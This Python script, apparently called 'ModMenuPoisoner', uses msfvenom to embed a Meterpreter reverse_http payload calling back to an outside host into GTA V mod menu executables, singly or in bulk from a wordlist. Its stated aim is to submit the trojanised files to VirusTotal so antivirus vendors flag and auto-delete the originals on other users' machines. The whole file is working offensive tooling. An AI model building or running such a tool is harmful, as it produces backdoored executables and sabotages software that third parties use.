#!/usr/bin/env python
# coding=UTF-8

#The first line allows this script to be executable

import os
import socket
import operator
# from termcolor import colored
import sys
import StringIO
sys.stdout.write("\x1b[8;{rows};{cols}t".format(rows=64, cols=200)) # sets window to full screen

payload_Generate = 'windows/meterpreter/reverse_http'
LHOST = '8.8.8.8'
LPORT = '443'
# input_Mod_Menu = str(raw_input("Enter the full path of the Mod Menu file: "))
bad_Bytes = 'x00'
payload_Encoder = 'x86/shikata_ga_nai'
payload_Iterations = '1'
output_Format = 'exe'
output_Dir = '/root/Documents/ModMenusReencoded/'
def poison_mod():
    input_Mod_Menu = str(raw_input("Enter the full path of the Mod Menu file: "))

    # Lets just keep the code simple, all the user has to do is copy and paste the file path, and rename the file
    output_Name = os.path.basename(input_Mod_Menu)
    output_File = output_Dir + output_Name

    cmd_String = "msfvenom -p {0} LHOST={1} LPORT={2} -x {3} -b '\{4}' -e {5} -i {6} -f {7} -o {8}".format(
        payload_Generate,
        LHOST,
        LPORT,
        input_Mod_Menu,
        bad_Bytes,
        payload_Encoder,
        payload_Iterations,
        output_Format,
        output_File
    )
    print 'Now running command: ' + cmd_String
    os.system(cmd_String)
    print 'Poisoned Mod Menu file generated, please see: ' + output_File + ' to submit it to VirusTotal!'
    print 'DISCLAIMER: Please wait up to 2 weeks so that all the AV solutions will begin accusing it of being a virus and get it auto-deleted on their machines'
    main()



def wordlist_poison():
    os.system('python /root/ModMenuPoisoner/wordlist_poison.py')
    main()
def open_dir():
    cmd_String = 'nautilus /root/Documents/ModMenusReencoded/'
    os.system(cmd_String)
    main()

def setup():
    os.system('mkdir /root/Documents/ModMenusReencoded/')
    print 'Setup complete'
    print 'For future reference, your reencoded mod menus will be located at: ' + output_Dir
    main()
def main():
    opt_List = [
        '\n\t#0. Exit the Poisoner Program',
        '#1. Poison a Mod Menu and make it look like a virus to VirusTotal',
        '#2. Open the directory where your altered mod menu files are located',
        '#3. Poison Mod Menu Executables via a Wordlist full of GTA V Mod Executables',
        '#SETUP. Creates the necessary directories and setup'
    ]

    print ("\n\t".join(opt_List))
    opt_Choice = str(raw_input("Enter a OPTION: "))

    if opt_Choice == "0":
        exit(0)
    elif opt_Choice == "1":
        os.system('clear')
        poison_mod()
    elif opt_Choice == "2":
        os.system('clear')
        open_dir()
    elif opt_Choice == "3":
        os.system('clear')
        wordlist_poison()
    elif opt_Choice == "SETUP":
        os.system('clear')
        setup()
    else:
        print 'You have entered a invalid option'
        main()
    return
main()
